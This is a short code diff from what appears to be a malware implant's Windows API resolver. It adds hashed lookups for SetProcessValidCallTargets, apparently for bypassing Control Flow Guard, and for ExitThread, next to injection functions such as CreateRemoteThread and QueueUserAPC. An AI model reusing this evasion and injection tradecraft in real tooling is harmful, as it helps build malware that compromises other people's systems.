@@ -69,6 +69,7 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
         if (
+            !F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS) ||
             !F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY) ||
             !F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST) ||
             !F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT) ||
@@ -110,6 +111,7 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.FormatMessageA,                  Ctx->modules.kernel32, FORMATMESSAGEA) ||
             !F_PTR_HMOD(Ctx->win32.CreateRemoteThread,              Ctx->modules.kernel32, CREATEREMOTETHREAD) ||
             !F_PTR_HMOD(Ctx->win32.CreateThread,                    Ctx->modules.kernel32, CREATETHREAD) ||
+            !F_PTR_HMOD(Ctx->win32.ExitThread,                      Ctx->modules.kernel32, EXITTHREAD) ||
             !F_PTR_HMOD(Ctx->win32.QueueUserAPC,                    Ctx->modules.kernel32, QUEUEUSERAPC) ||
             !F_PTR_HMOD(Ctx->win32.GetThreadLocale,                 Ctx->modules.kernel32, GETTHREADLOCALE) ||
             !F_PTR_HMOD(Ctx->win32.SleepEx,                         Ctx->modules.kernel32, SLEEPEX) ||
